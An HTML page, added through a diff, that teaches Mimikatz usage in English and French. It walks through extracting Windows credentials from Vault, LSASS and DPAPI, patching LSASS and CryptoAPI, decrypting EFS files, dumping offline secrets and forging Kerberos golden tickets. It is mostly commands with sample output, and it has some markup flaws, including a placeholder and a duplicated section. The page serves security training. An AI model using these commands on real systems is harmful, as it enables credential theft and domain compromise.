@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mimikatz Tutorial</title>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Fira Code', monospace;
+      background-color: #0e0e0e;
+      color: #c7c7c7;
+      line-height: 1.6;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      padding: 0;
+      margin: 0;
+      color: #fff;
+      text-align: center;
+    }
+    footer {
+      background: linear-gradient(to right, #41013f, #200020);
+      padding: 100;
+      color: #fff;
+      text-align: center;
+    }
+    .container {
+      max-width: 960px;
+      margin: auto;
+      padding: 20px;
+    }
+    h1, h2, h3 {
+      color: #a259ff;
+    }
+    .quote {
+      border-left: 4px solid #a259ff;
+      padding-left: 10px;
+      color: #ff5cad;
+      font-style: italic;
+    }
+    pre {
+      background-color: #1e1e1e;
+      padding: 10px;
+      overflow-x: auto;
+      border-left: 4px solid #a259ff;
+      color: #7df9ff;
+    }
+    a {
+      color: #a259ff;
+    }
+    #lang-toggle {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      z-index: 9999;
+    }
+    #flag-icon {
+      width: 40px;
+      height: 40px;
+    }
+    .banner {
+    position: relative;
+    text-align: center;
+    color: white;
+    height: 60vh; /* Définit la hauteur à 30% de la hauteur de la fenêtre */
+    overflow: hidden; /* Coupe l'image si elle dépasse */
+  }
+  .banner img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover; /* Ensures the image covers the entire banner */
+    object-position: center top;
+  }
+  .banner h1 {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    margin: 0;
+  }
+  </style>
+  <script defer src="./script.js"></script>
+</head>
+<body>
+  <header>
+    <div class="banner">
+      <img src="mimikatz2.png" alt="Banner">
+    </div>
+    <button id="lang-toggle">
+      <img id="flag-icon" src="fr.png" alt="Langue">
+    </button>
+  </header>
+  <div class="container">
+    <section>
+      <h2>Introduction</h2>
+      <p>Mimikatz is a powerful post-exploitation tool authored by Benjamin DELPY. This guide presents its fundamental concepts, advanced usage, and real-world applications, helping cybersecurity professionals master credential extraction, memory manipulation, and privilege escalation on Windows systems.</p>
+    </section>
+    <section>
+        <h2 data-lang-en="The Standard Credential Extraction" data-lang-fr="Extraction Standard des Identifiants">The Standard Credential Extraction</h2>
+        <p data-lang-en="Mimikatz simplifies the process of extracting credentials from a Windows system using a straightforward command: vault::cred. This command retrieves stored credentials from the Windows Vault, which is used to store sensitive data such as passwords and authentication tokens."
+           data-lang-fr="Mimikatz simplifie l'extraction des identifiants d'un système Windows grâce à une commande simple : vault::cred. Cette commande permet de récupérer les identifiants stockés dans le Windows Vault, qui contient des données sensibles comme des mots de passe et des tokens.">
+           The Standard Credential Extraction explanation
+        </p>
+      
+        <h3 data-lang-en="Basic Command Usage" data-lang-fr="Utilisation de Base de la Commande">Basic Command Usage</h3>
+        <p data-lang-en="To extract credentials using Mimikatz, the command is as follows:"
+           data-lang-fr="Pour extraire des identifiants avec Mimikatz, la commande est la suivante :">
+           To extract credentials using Mimikatz...
+        </p>
+        <pre><code>mimikatz # vault::cred</code></pre>
+      
+        <p data-lang-en="Example output:" data-lang-fr="Exemple de sortie :">Example output:</p>
+        <pre><code>[... contenu inchangé ...]</code></pre>
+      </section>
+      
+      <section>
+        <h2 data-lang-en="Explanation of Output" data-lang-fr="Explication de la Sortie">Explanation of Output</h2>
+        <ul>
+          <li data-lang-en="TargetName: The name of the target resource or service." data-lang-fr="TargetName : Nom de la ressource ou du service cible.">TargetName...</li>
+          <li data-lang-en="UserName: The username associated with the credential." data-lang-fr="UserName : Le nom d'utilisateur lié à l'identifiant.">UserName...</li>
+          <li data-lang-en="Type: Indicates the type of credential (1 - generic, 2 - domain_password)." data-lang-fr="Type : Type d'identifiant (1 - générique, 2 - mot de passe domaine).">Type...</li>
+          <li data-lang-en="Persist: Describes the persistence level (3 - enterprise)." data-lang-fr="Persist : Niveau de persistance (3 - entreprise).">Persist...</li>
+          <li data-lang-en="Flags: Additional flags associated with the credential." data-lang-fr="Flags : Indicateurs associés à l'identifiant.">Flags...</li>
+          <li data-lang-en="Credential: The actual credential data, such as a password." data-lang-fr="Credential : Les données sensibles, comme un mot de passe.">Credential...</li>
+        </ul>
+        <p data-lang-en="This output is generated using the standard API CredEnumerate with the CRED_ENUMERATE_ALL_CREDENTIALS flag."
+           data-lang-fr="Cette sortie est générée via l'API standard CredEnumerate avec le flag CRED_ENUMERATE_ALL_CREDENTIALS.">
+           API description
+        </p>
+      
+        <h2 data-lang-en="Using Mimikatz to Extract Web Credentials" data-lang-fr="Utiliser Mimikatz pour Extraire des Identifiants Web">Using Mimikatz to Extract Web Credentials</h2>
+        <p data-lang-en="Combining vault::cred with vault::list yields a comprehensive list of credentials, especially for web services."
+           data-lang-fr="En combinant vault::cred avec vault::list, on obtient une liste complète d'identifiants, notamment pour les services web.">
+           vault::list...
+        </p>
+        <pre><code>mimikatz # vault::list</code></pre>
+      
+        <h2 data-lang-en="Working with LSASS and DPAPI" data-lang-fr="Travailler avec LSASS et DPAPI">Working with LSASS and DPAPI</h2>
+        <p data-lang-en="In some cases, you may need to access network share credentials, RDP passwords, etc., which are stored in LSASS. This requires administrative privileges to alter LSASS."
+           data-lang-fr="Dans certains cas, il est nécessaire d'accéder à des identifiants de partage réseau, mots de passe RDP, etc., stockés dans LSASS. Cela nécessite des droits administrateur.">
+           LSASS description
+        </p>
+      
+        <h2 data-lang-en="Altering LSASS Logic" data-lang-fr="Modifier le Comportement de LSASS">Altering LSASS Logic</h2>
+        <p data-lang-en="You can use the /patch argument to prevent LSASS from checking the credential type:"
+           data-lang-fr="Vous pouvez utiliser l'argument /patch pour éviter que LSASS ne vérifie le type d'identifiant :">
+           LSASS patch
+        </p>
+        <pre><code>mimikatz # sekurlsa::patch</code></pre>
+        <p data-lang-en="This approach is risky and generally not recommended. Using the Data Protection API (DPAPI) is a safer method."
+           data-lang-fr="Cette méthode est risquée et rarement recommandée. Il est préférable d'utiliser l'API de protection des données (DPAPI).">
+           Warning
+        </p>
+      </section>
+
+      <section>
+        <h2 data-lang-en="Extracting Credentials with DPAPI" data-lang-fr="Extraction des identifiants avec DPAPI">Extracting Credentials with DPAPI</h2>
+        <p data-lang-en="DPAPI is a built-in Windows mechanism for protecting data. Credentials are stored in user profiles, typically found in:"
+           data-lang-fr="DPAPI est un mécanisme intégré à Windows pour protéger les données. Les identifiants sont stockés dans les profils utilisateurs, généralement ici :">
+           Intro
+        </p>
+        <pre><code>%appdata%\Microsoft\Credentials
+      %localappdata%\Microsoft\Credentials</code></pre>
+      
+        <h3 data-lang-en="Example Command" data-lang-fr="Commande Exemple">Example Command</h3>
+        <p data-lang-en="To view the content of a credential file:"
+           data-lang-fr="Pour visualiser le contenu d’un fichier d’identifiants :">
+           Command explanation
+        </p>
+        <pre><code>mimikatz # dpapi::cred /in:"%appdata%\Microsoft\Credentials\85E671988F9AD21981A4B6791F9A4EE8"</code></pre>
+      
+        <p data-lang-en="This command will output details such as:"
+           data-lang-fr="Cette commande affichera des détails tels que :">
+           Output description
+        </p>
+        <pre><code>**BLOB**
+      dwVersion        : 00000001 - 1
+      guidProvider     : {df9d8c0d-15e1-11d1-8c7a-00c04fc297eb}
+      ...
+      szDescription    : Données d’identification d’entreprise
+      ...</code></pre>
+      </section>
+      
+      <section>
+        <h2 data-lang-en="Decrypting the Blob" data-lang-fr="Déchiffrer le BLOB">Decrypting the Blob</h2>
+        <p data-lang-en="If the dwFlags includes CRYPTPROTECT_SYSTEM, the blob is protected by the system and cannot be decrypted by a standard user. The guidMasterKey indicates the necessary master key for decryption."
+           data-lang-fr="Si dwFlags contient CRYPTPROTECT_SYSTEM, le blob est protégé par le système et ne peut pas être déchiffré par un utilisateur standard. guidMasterKey indique la clé maître requise.">
+           Blob explanation
+        </p>
+      
+        <h2 data-lang-en="Master Key Location" data-lang-fr="Emplacement de la clé maître">Master Key Location</h2>
+        <p data-lang-en="Master keys are stored in:"
+           data-lang-fr="Les clés maîtres sont stockées ici :">
+           Key location
+        </p>
+        <pre><code>%appdata%\Microsoft\Protect\<userid>\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2</code></pre>
+      
+        <p data-lang-en="To extract the master key:"
+           data-lang-fr="Pour extraire la clé maître :">
+           Extract key
+        </p>
+        <pre><code>mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-...\\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2"</code></pre>
+      
+        <h2 data-lang-en="Using RPC for Domain Controllers" data-lang-fr="Utilisation de RPC pour les contrôleurs de domaine">Using RPC for Domain Controllers</h2>
+        <p data-lang-en="Domain controllers can decrypt master keys for authorized users using the RPC service. To use this feature:"
+           data-lang-fr="Les contrôleurs de domaine peuvent déchiffrer les clés maîtres via le service RPC. Pour utiliser cette fonction :">
+           RPC explanation
+        </p>
+        <pre><code>mimikatz # dpapi::masterkey /in:"..." /rpc</code></pre>
+      
+        <h2 data-lang-en="Final Decryption" data-lang-fr="Déchiffrement Final">Final Decryption</h2>
+        <p data-lang-en="With the master key in Mimikatz’s cache, decrypt the credential file again:"
+           data-lang-fr="Une fois la clé maître en cache Mimikatz, relancez le déchiffrement du fichier :">
+           Final decrypt
+        </p>
+        <pre><code>mimikatz # dpapi::cred /in:"%appdata%\Microsoft\Credentials\85E671988F9AD21981A4B6791F9A4EE8"</code></pre>
+      
+        <p data-lang-en="The output will include decrypted credentials:"
+           data-lang-fr="La sortie contiendra les identifiants déchiffrés :">
+           Decrypted output
+        </p>
+        <pre><code>**CREDENTIAL**
+      credFlags        : 00000030 = 48
+      credSize         : 0000008e = 142
+      ...
+      UserName         : domusr
+      CredentialBlob   : dompass</code></pre>
+      </section>
+
+      
+
+
+
+      <section>
+        <h2 data-lang-en="Decrypt EFS Files" data-lang-fr="Déchiffrer les fichiers EFS">Decrypt EFS Files</h2>
+        <p data-lang-en="Decrypting Encrypted File System (EFS) files can be complex, but manageable with the right tools and knowledge. This guide assumes access to the encrypted files and necessary user data."
+           data-lang-fr="Le déchiffrement des fichiers EFS peut être complexe, mais reste gérable avec les bons outils et connaissances. Ce guide suppose que vous avez accès aux fichiers chiffrés et aux données utilisateur nécessaires.">
+          Decrypting Encrypted File System (EFS) files can be complex...
+        </p>
+      
+        <h3 data-lang-en="Decryption Steps" data-lang-fr="Étapes de déchiffrement">Decryption Steps</h3>
+        <ol>
+          <li data-lang-en="Retrieve and export the necessary certificate." data-lang-fr="Récupérer et exporter le certificat nécessaire.">Retrieve and export the certificate.</li>
+          <li data-lang-en="Locate and export the associated private key." data-lang-fr="Localiser et exporter la clé privée associée.">Locate and export the key.</li>
+          <li data-lang-en="Decrypt the master key using the user password." data-lang-fr="Déchiffrer la clé maître avec le mot de passe utilisateur.">Decrypt master key.</li>
+          <li data-lang-en="Use the decrypted master key to decrypt the private key." data-lang-fr="Utiliser la clé maître pour déchiffrer la clé privée.">Decrypt the private key.</li>
+          <li data-lang-en="Apply the decrypted private key to access the encrypted file." data-lang-fr="Utiliser la clé privée déchiffrée pour accéder au fichier.">Access the file.</li>
+        </ol>
+      
+        <h3 data-lang-en="Prerequisites" data-lang-fr="Pré-requis">Prerequisites</h3>
+        <ol>
+          <li data-lang-en="Encrypted file(s) access on a Windows system." data-lang-fr="Accès aux fichiers chiffrés sur un système Windows.">Encrypted files on system.</li>
+          <li data-lang-en="SystemCertificates, Crypto, Protect folders in AppData." data-lang-fr="Dossiers SystemCertificates, Crypto, Protect dans AppData.">
+            <code>d:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft</code>
+          </li>
+          <li data-lang-en="Master key or way to decrypt it (password, hash...)" data-lang-fr="Clé maître ou méthode de déchiffrement (mot de passe, hash...)">
+            Master key e.g. <code>waza1234/</code>
+          </li>
+        </ol>
+      
+        <h3 data-lang-en="Get Information about the Encrypted File" data-lang-fr="Obtenir des informations sur le fichier chiffré">Get File Info</h3>
+        <p data-lang-en="Gather details about the file and certificate." data-lang-fr="Récupérez les détails du fichier et du certificat.">
+          cipher command:
+        </p>
+        <pre><code>cipher /c "d:\\Users\\Gentil Kiwi\\Documents\\encrypted.txt"</code></pre>
+      </section>
+      <section>
+        <h3 data-lang-en="Export the Certificate" data-lang-fr="Exporter le certificat">Export the Certificate</h3>
+        <p data-lang-en="Use Mimikatz to export the certificate:" data-lang-fr="Utilisez Mimikatz pour exporter le certificat :"></p>
+        <pre><code>mimikatz # crypto::system /file:"D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates\\B53C6DE283..." /export</code></pre>
+      
+        <h3 data-lang-en="Locate and Export the Private Key" data-lang-fr="Localiser et exporter la clé privée">Locate Private Key</h3>
+        <p data-lang-en="Find the key matching the exported certificate:" data-lang-fr="Trouvez la clé correspondant au certificat exporté :"></p>
+        <pre><code>mimikatz # dpapi::capi /in:"D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\...\\filename"</code></pre>
+      
+        <h3 data-lang-en="Decrypt the Master Key" data-lang-fr="Déchiffrer la clé maître">Decrypt Master Key</h3>
+        <p data-lang-en="Use Mimikatz to decrypt the master key with known password:" data-lang-fr="Déchiffrez la clé maître avec le mot de passe connu :"></p>
+        <pre><code>mimikatz # dpapi::masterkey /in:"D:\\...\\Protect\\...\\eccbd2c2..." /password:waza1234/</code></pre>
+      </section> 
+      <section>
+        <h3 data-lang-en="5. Decrypt the Private Key" data-lang-fr="5. Déchiffrer la clé privée">5. Decrypt the Private Key</h3>
+        <p data-lang-en="With the master key decrypted, proceed to decrypt the private key." data-lang-fr="Une fois la clé maître déchiffrée, déchiffrez la clé privée."></p>
+        <pre><code>mimikatz # dpapi::capi /masterkey:7e86f2b799... /in:"D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-...\\filename"</code></pre>
+      
+        <h3 data-lang-en="6. Decrypt the EFS File" data-lang-fr="6. Déchiffrer le fichier EFS">6. Decrypt the EFS File</h3>
+        <p data-lang-en="Finally, use the decrypted private key to decrypt the EFS
+           data-lang-fr="Enfin, utilisez la clé privée déchiffrée pour déchiffrer le fichier EFS. Cette étape peut nécessiter des outils ou scripts supplémentaires.">
+        </p>
+      
+        <h2 data-lang-en="Scheduled Tasks Credentials" data-lang-fr="Identifiants des tâches planifiées">Scheduled Tasks Credentials</h2>
+        <p data-lang-en="This guide demonstrates how to retrieve scheduled task passwords using Mimikatz. It involves accessing Windows credential vaults and decrypting blobs."
+           data-lang-fr="Ce guide montre comment récupérer les mots de passe des tâches planifiées avec Mimikatz en accédant au coffre Windows et en déchiffrant les blobs.">
+        </p>
+      
+        <h3 data-lang-en="Step-by-Step Instructions" data-lang-fr="Instructions étape par étape">Step-by-Step Instructions</h3>
+      
+        <h4 data-lang-en="1. Vault Credentials Method" data-lang-fr="1. Méthode via le coffre Windows">1. Vault Credentials Method</h4>
+        <p data-lang-en="After creating a scheduled task, Windows stores a copy of the credential in the owner's credential vault. Use Mimikatz to extract it:"
+           data-lang-fr="Après création d’une tâche, Windows stocke une copie du mot de passe dans le coffre. Utilisez Mimikatz pour l’extraire :">
+        </p>
+        <pre><code>mimikatz # vault::cred</code></pre>
+      </section>
+      <section>
+        <pre><code>TargetName : LAB\\admin / &lt;NULL&gt;
+      UserName   : LAB\\admin
+      Type       : 1 - generic
+      Persist    : 3 - enterprise
+      Credential : waza1234/a</code></pre>
+      
+        <p data-lang-en="These credentials can be exposed by using sekurlsa::credman or sekurlsa::logonpasswords:"
+           data-lang-fr="Ces identifiants peuvent être révélés avec sekurlsa::credman ou sekurlsa::logonpasswords :"></p>
+        <pre><code>mimikatz # sekurlsa::credman</code></pre>
+      
+        <p data-lang-en="Example output:" data-lang-fr="Exemple de sortie :"></p>
+        <pre><code>Authentication Id : 0 ; 183160 (00000000:0002cb78)
+      Session           : Interactive from 1
+      User Name         : Administrateur
+      Domain            : LAB
+      Logon Server      : DC-0
+      Logon Time        : 03/01/2017 22:27:52
+      SID               : S-1-5-21-...-500
+          * Username : LAB\\admin
+          * Domain   : LAB\\admin
+          * Password : waza1234/a</code></pre>
+      
+        <h4 data-lang-en="2. Elevating to SYSTEM" data-lang-fr="2. Élévation SYSTEM">2. Elevating to SYSTEM</h4>
+        <p data-lang-en="To access system credentials, elevate to SYSTEM and request the credentials:"
+           data-lang-fr="Pour accéder aux identifiants système, élevez-vous en SYSTEM et interrogez les identifiants :"></p>
+        <pre><code>mimikatz # privilege::debug
+      mimikatz # token::elevate
+      mimikatz # vault::cred</code></pre>
+      </section>
+      <section>
+        <h4 data-lang-en="2. Elevating to SYSTEM" data-lang-fr="2. Élévation en SYSTEM">2. Elevating to SYSTEM</h4>
+        <p data-lang-en="To access system credentials, elevate to SYSTEM and request the credentials:"
+           data-lang-fr="Pour accéder aux identifiants système, élevez-vous en SYSTEM et interrogez les identifiants :"></p>
+        <pre><code>mimikatz # privilege::debug
+      mimikatz # token::elevate
+      mimikatz # vault::cred</code></pre>
+      
+        <p data-lang-en="Example output:" data-lang-fr="Exemple de sortie :"></p>
+        <pre><code>TargetName : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BD4E749E965} / &lt;NULL&gt;
+      UserName   : LAB\\admin
+      Type       : 2 - domain_password
+      Persist    : 2 - local_machine
+      Flags      : 00000004
+      Credential : 
+      Attributes : 0</code></pre>
+      
+        <p data-lang-en="To expose the credential, use the patch option:"
+           data-lang-fr="Pour afficher l'identifiant, utilisez l'option de patch :"></p>
+        <pre><code>mimikatz # vault::cred /patch</code></pre>
+      
+        <p data-lang-en="Example output:" data-lang-fr="Exemple de sortie :"></p>
+        <pre><code>TargetName : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BD4E749E965} / &lt;NULL&gt;
+      UserName   : LAB\\admin
+      Credential : waza1234/a</code></pre>
+      </section>
+      <section>
+        <h3 data-lang-en="3. DPAPI Method" data-lang-fr="3. Méthode DPAPI">3. DPAPI Method</h3>
+        <p data-lang-en="System credentials are stored in:"
+           data-lang-fr="Les identifiants système sont stockés ici :"></p>
+        <pre><code>%systemroot%\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials</code></pre>
+      
+        <p data-lang-en="List the directory contents:" data-lang-fr="Lister le contenu du dossier :"></p>
+        <pre><code>C:\\&gt; dir /a
+      %systemroot%\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials</code></pre>
+      
+        <p data-lang-en="Decrypt the credential blob with Mimikatz:" data-lang-fr="Déchiffrer le blob avec Mimikatz :"></p>
+        <pre><code>mimikatz # dpapi::cred /in:\"%systemroot%\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\AA10EB8126AA20B83E9542B120AF904C\"</code></pre>
+      
+        <p data-lang-en="Example output:" data-lang-fr="Exemple de sortie :"></p>
+        <pre><code>**CREDENTIAL**
+      credFlags       : 00000030 = 48
+      credSize        : 000000fe = 254
+      Type            : 00000002 - 2 - domain_password
+      UserName        : LAB\\admin
+      CredentialBlob  : waza1234/a</code></pre>
+      
+        <h4 data-lang-en="4. Extracting DPAPI Master Keys" data-lang-fr="4. Extraire les clés maîtres DPAPI">4. Extracting DPAPI Master Keys</h4>
+        <p data-lang-en="To extract and use DPAPI master keys:" data-lang-fr="Pour extraire et utiliser les clés maîtres :"></p>
+        <pre><code>mimikatz # sekurlsa::dpapi</code></pre>
+      </section>
+      <section>
+        <p data-lang-en="Use the master key to decrypt the credential blob:" data-lang-fr="Utilisez la clé maître pour déchiffrer le blob :"></p>
+        <pre><code>mimikatz # dpapi::cred /in:"%systemroot%\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\AA10EB8126AA20B83E9542B120AF904C"
+      masterkey:049e924fc93420ed6d1e3731c24fc9fcb6dcdd258ac2106dc426dec3adc1200ee7abdd56c68cd05185f02d39ac2b2ca5158534ea5c53c2d6e73bbce</code></pre>
+      
+        <p data-lang-en="Example output:" data-lang-fr="Exemple de sortie :"></p>
+        <pre><code>**CREDENTIAL**
+      UserName        : LAB\\admin
+      CredentialBlob  : waza1234/a</code></pre>
+      
+        <h3 data-lang-en="5. Offline Method" data-lang-fr="5. Méthode hors ligne">5. Offline Method</h3>
+        <p data-lang-en="To retrieve credentials offline, dump secrets from SYSTEM and SECURITY files:"
+           data-lang-fr="Pour récupérer les identifiants hors ligne, extrayez les secrets de SYSTEM et SECURITY :"></p>
+        <pre><code>mimikatz # lsadump::secrets /system:c:\\backup\\SYSTEM /security:c:\\backup\\SECURITY</code></pre>
+      
+        <p data-lang-en="Extract and decrypt master key:" data-lang-fr="Extraire et déchiffrer la clé maître :"></p>
+        <pre><code>mimikatz # dpapi::masterkey /in:\"%systemroot%\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\5d4e7ed0-d922-4783-8efc-9319b45b1c9a\" /system:c89e3964a40b5aa3b3993c8320822f857d9182c</code></pre>
+      
+        <p data-lang-en="Decrypt the credential blob:" data-lang-fr="Déchiffrer le blob d’identifiants :"></p>
+        <pre><code>mimikatz # dpapi::cred /in:\"%systemroot%\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\AA10EB8126AA20B83E9542B120AF904C\"</code></pre>
+      </section>
+      <section>
+        <h2 data-lang-en="Crypto Module" data-lang-fr="Module Crypto">Crypto Module</h2>
+        <p data-lang-en="The Mimikatz crypto module is a versatile tool for interacting with CryptoAPI functions..."
+           data-lang-fr="Le module crypto de Mimikatz est un outil polyvalent pour interagir avec les fonctions CryptoAPI...">
+           It includes certutil-like functionality, token impersonation, patching APIs, and more.
+        </p>
+      
+        <ul>
+          <li data-lang-en="Use crypto::stores to list available stores" data-lang-fr="Utiliser crypto::stores pour lister les magasins disponibles."></li>
+          <li data-lang-en="Export non-exportable keys using crypto::capi or crypto::cng" data-lang-fr="Exporter les clés avec crypto::capi ou crypto::cng"></li>
+          <li data-lang-en="Ensure proper ACL permissions (some require elevated access)"
+              data-lang-fr="Vérifier les ACL – certaines opérations demandent des privilèges élevés"></li>
+          <li data-lang-en="Smartcard providers may falsely report success"
+              data-lang-fr="Les fournisseurs smartcard peuvent faussement indiquer un succès d’export"></li>
+        </ul>
+      
+        <h3 data-lang-en="Commands" data-lang-fr="Commandes">Commands</h3>
+      
+        <h4 data-lang-en="providers" data-lang-fr="fournisseurs">providers</h4>
+        <p data-lang-en="Lists all available providers including CryptoAPI and CNG providers if available."
+           data-lang-fr="Liste tous les fournisseurs disponibles, y compris CryptoAPI et CNG."></p>
+      
+        <h4 data-lang-en="Usage" data-lang-fr="Utilisation">Usage</h4>
+        <pre><code>mimikatz # crypto::providers</code></pre>
+      
+        <h4 data-lang-en="Output Example" data-lang-fr="Exemple de sortie">Output Example</h4>
+        <pre><code>CryptoAPI providers :
+       0. RSA_FULL (1) – Microsoft Base Cryptographic Provider v1.0
+      ...
+      CNG providers :
+       0. Microsoft Key Protection Provider
+      ...</code></pre>
+      </section>
+      <section>
+        <h3 data-lang-en="capi" data-lang-fr="capi">capi</h3>
+        <p data-lang-en="Patches a CryptoAPI function within Mimikatz to make unexportable keys exportable."
+           data-lang-fr="Patche une fonction CryptoAPI dans Mimikatz pour rendre exportables les clés non exportables.">
+        </p>
+        <p data-lang-en="Useful for providers such as:" data-lang-fr="Utile pour les fournisseurs suivants :"></p>
+        <ul>
+          <li>Microsoft Base Cryptographic Provider v1.0</li>
+          <li>Microsoft Enhanced Cryptographic Provider v1.0</li>
+          <li>Microsoft Enhanced RSA and AES Cryptographic Provider</li>
+          <li>Microsoft RSA Schannel Cryptographic Provider</li>
+          <li>Microsoft Strong Cryptographic Provider</li>
+        </ul>
+      
+        <h4 data-lang-en="Usage" data-lang-fr="Utilisation">Usage</h4>
+        <pre><code>mimikatz # crypto::capi</code></pre>
+      
+        <h4 data-lang-en="Output Example" data-lang-fr="Exemple de sortie">Output Example</h4>
+        <pre><code>Local CryptoAPI patched</code></pre>
+      
+        <h3 data-lang-en="cng" data-lang-fr="cng">cng</h3>
+        <p data-lang-en="Modifies the KeyIso service to make unexportable keys exportable. Useful for Microsoft Software Key Storage Provider."
+           data-lang-fr="Modifie le service KeyIso pour rendre les clés non exportables — utile pour le fournisseur de stockage de clés.">
+        </p>
+      
+        <h4 data-lang-en="Usage" data-lang-fr="Utilisation">Usage</h4>
+        <pre><code>mimikatz # privilege::debug
+      mimikatz # crypto::cng</code></pre>
+      
+        <h4 data-lang-en="Output Example" data-lang-fr="Exemple de sortie">Output Example</h4>
+        <pre><code>\"KeyIso\" service patched</code></pre>
+      </section>
+      <section>
+        <h2 data-lang-en="kerberos" data-lang-fr="kerberos">kerberos</h2>
+        <p data-lang-en="The Kerberos module in Mimikatz allows interaction with Microsoft's Kerberos API. It supports Golden Ticket creation, ticket injection and listing."
+           data-lang-fr="Le module Kerberos de Mimikatz permet d’interagir avec l’API Kerberos de Microsoft. Il permet la création de Golden Tickets, l’injection de tickets et leur visualisation.">
+        </p>
+      
+        <h3 data-lang-en="Commands Overview" data-lang-fr="Aperçu des commandes">Commands Overview</h3>
+        <ul>
+          <li><strong>ptt</strong>: Pass-The-Ticket</li>
+          <li><strong>golden / silver</strong>: Créer des tickets TGT/TGS</li>
+          <li><strong>list</strong>: Lister les tickets</li>
+          <li><strong>tgt</strong>: Afficher les TGT actuels</li>
+          <li><strong>purge</strong>: Supprimer tous les tickets de la session</li>
+        </ul>
+      
+        <h3 data-lang-en="Command Details" data-lang-fr="Détails des commandes">Command Details</h3>
+        <h4 data-lang-en="ptt (Pass-The-Ticket)" data-lang-fr="ptt (Pass-The-Ticket)">ptt (Pass-The-Ticket)</h4>
+        <p data-lang-en="Injects one or multiple Kerberos tickets into the session." data-lang-fr="Injecte un ou plusieurs tickets dans la session."></p>
+      
+        <p><strong>Arguments:</strong></p>
+        <ul>
+          <li><code>filename</code>: The ticket’s file path</li>
+          <li><code>directory</code>: A folder with <code>.kirbi</code> files</li>
+        </ul>
+      
+        <p data-lang-en="Example:" data-lang-fr="Exemple :"></p>
+        <pre><code>mimikatz # kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi</code></pre>
+      
+        <h4 data-lang-en="golden / silver" data-lang-fr="golden / silver">golden / silver</h4>
+        <p data-lang-en="Creates Kerberos tickets (TGT or TGS) with arbitrary data for any user."
+           data-lang-fr="Crée des tickets Kerberos (TGT ou TGS) avec des données personnalisées."></p>
+      </section>
+      <section>
+        <h4 data-lang-en="Common Arguments" data-lang-fr="Arguments communs">Common Arguments</h4>
+        <ul>
+          <li><code>/domain</code> – <span data-lang-en="Fully qualified domain name (e.g., chocolate.local)" data-lang-fr="Nom de domaine complet (ex : chocolate.local)"></span></li>
+          <li><code>/sid</code> – <span data-lang-en="SID of the domain" data-lang-fr="SID du domaine"></span></li>
+          <li><code>/user</code> – <span data-lang-en="Username to impersonate" data-lang-fr="Nom d'utilisateur à usurper"></span></li>
+          <li><code>/id</code> – <span data-lang-en="User ID (500 = admin)" data-lang-fr="ID utilisateur (500 = admin)"></span></li>
+          <li><code>/groups</code> – <span data-lang-en="Group IDs separated by comma" data-lang-fr="Groupes d’appartenance séparés par virgule"></span></li>
+        </ul>
+      
+        <h4 data-lang-en="Key Arguments" data-lang-fr="Arguments de clés">Key Arguments</h4>
+        <ul>
+          <li><code>/rc4</code> or <code>/krbtgt</code>: <span data-lang-en="NTLM hash" data-lang-fr="Hash NTLM"></span></li>
+          <li><code>/aes128</code>: <span data-lang-en="AES128 key" data-lang-fr="Clé AES128"></span></li>
+          <li><code>/aes256</code>: <span data-lang-en="AES256 key" data-lang-fr="Clé AES256"></span></li>
+        </ul>
+      
+        <h4 data-lang-en="Target & Service for Silver Ticket" data-lang-fr="Cible & service pour Silver Ticket">Target & Service</h4>
+        <ul>
+          <li><code>/target</code>: <span data-lang-en="Computer name where service is hosted" data-lang-fr="Nom de l'hôte"></span></li>
+          <li><code>/service</code>: <span data-lang-en="Service name" data-lang-fr="Nom du service"></span></li>
+        </ul>
+      
+        <h4 data-lang-en="Ticket Output" data-lang-fr="Ticket généré">Ticket Output</h4>
+        <ul>
+          <li><code>/ticket</code>: <span data-lang-en="Output file (default: ticket.kirbi)" data-lang-fr="Fichier de sortie (par défaut : ticket.kirbi)"></span></li>
+          <li><code>/ptt</code>: <span data-lang-en="Inject ticket into session without saving" data-lang-fr="Injecter sans sauvegarder"></span></li>
+        </ul>
+      
+        <h4 data-lang-en="Lifetime Arguments" data-lang-fr="Arguments de durée">Lifetime Arguments</h4>
+        <ul>
+          <li><code>/startoffset</code>: <span data-lang-en="Start offset (min)" data-lang-fr="Début du ticket (minutes)"></span></li>
+          <li><code>/endin</code>: <span data-lang-en="Ticket duration (min)" data-lang-fr="Durée du ticket (minutes)"></span></li>
+          <li><code>/renewmax</code>: <span data-lang-en="Max renewal (min)" data-lang-fr="Renouvellement max (minutes)"></span></li>
+        </ul>
+      
+        <p><strong>Example:</strong></p>
+        <pre><code>mimikatz # kerberos::golden /user:utilisateur /domain:chocolate.local \\
+      /sid:S-1-5-21-130452501-2365100805-3685010670 \\
+      /krbtgt:318b643c5316c8c3c70a1c0ef17be231 /id:1107 /groups:513 \\
+      /ticket:utilisateur.chocolate.kirbi</code></pre>
+      </section>
+      <section>
+        <h4 data-lang-en="tgt" data-lang-fr="tgt">tgt</h4>
